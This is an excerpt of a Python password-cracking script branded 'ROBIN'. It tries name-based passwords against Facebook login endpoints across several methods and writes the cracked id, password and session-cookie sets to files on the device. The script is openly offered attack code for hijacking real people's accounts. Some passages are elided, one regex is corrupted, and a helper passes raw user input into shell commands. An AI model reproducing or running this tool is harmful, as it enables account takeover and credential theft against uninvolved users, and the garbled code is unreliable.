...
╚═╝░░╚═╝░╚════╝░╚═════╝░╚═╝╚═╝░░╚══╝
\033[1;37m------------------------------------------------
\033[1;37m Owner   :            MD ROBIN MOLLA
\033[1;37m Facebook:            MD ROBIN MOLLA
\033[1;37m Github  :            ROBIN-Robin
...
def robin():   
    ...
    if select =='1':
       ...
       cutter()
        ...
        os.system('xdg-open https://wa.me/qr/GKWWYBLXHF5JH1)
        pass
    elif select =='F':
        os.system('xdg-open https://www.facebook.com/profile.php?id=61559045096348&mibextid=ZbWKwL)
    else:
        print('\n Select valid option ... ')
        time.sleep(2)
        SSB(allkey)
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [ROBIN-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/ROBIN_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SSB_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r{A} [ROBIN-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/ROBIN_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[ROBIN] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [ROBIN-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/ROBIN_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/ROBIN_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[ROBIN] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        ...
        try:
            for pw in psw:
                ...
                idpass ={"lsd":re.search('name="lsd" value="(.ROBIN)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":sid,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":ps,}
                session.headers = {}
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    oks.append(sid)
                    open('/sdcard/ROBIN_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
...
def cutter():
    ...
    sarfraz = input('Saving Put File Name:')
    os.system('touch ' +robin)
    os.system('sort -r '+robin+' | uniq > '+robin)
    os.system('clear')
    print(logo)
    print("Removed Successful From File: " + robin )
    print("New File Saved:" + ROBIN )
    print(47*'-')
    input(f"{S} Press Enter To Back ROBIN Menu ")
    ROBIN(allkey)       
